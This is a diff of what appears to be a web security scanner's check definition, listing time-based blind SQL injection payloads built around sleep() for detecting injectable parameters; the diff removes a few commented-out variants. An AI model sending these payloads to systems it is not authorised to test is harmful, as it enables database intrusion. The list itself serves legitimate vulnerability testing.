@@ -17,23 +17,19 @@ source: |
   var SLEEP_PLACEHOLDER = "§§§SLEEP_TIME§§§";
   
   var payloadTemplates = java.util.List.of(
-    //"'XOR(if(now()=sysdate(),sleep(§§§SLEEP_TIME§§§),0))XOR'Z",
     "'XOR(if(isnull(nullif(now(),sysdate())),sleep(§§§SLEEP_TIME§§§),0))XOR'Z",
     "'(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)'",
     "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
     "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
-    //"'+(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)+'",
     "-(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
     ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
     ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
-    //"'OR(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)OR'Z",
     "'AND(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)AND'Z",
     " AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
     "' AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
     ") AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
     "') AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
     "->test\"',(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'",
-    //"->test\"'))# (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
     "->test\"' ASC, (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)) DESC-- z\"'",
     "->test\"') XOR (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'"
   );
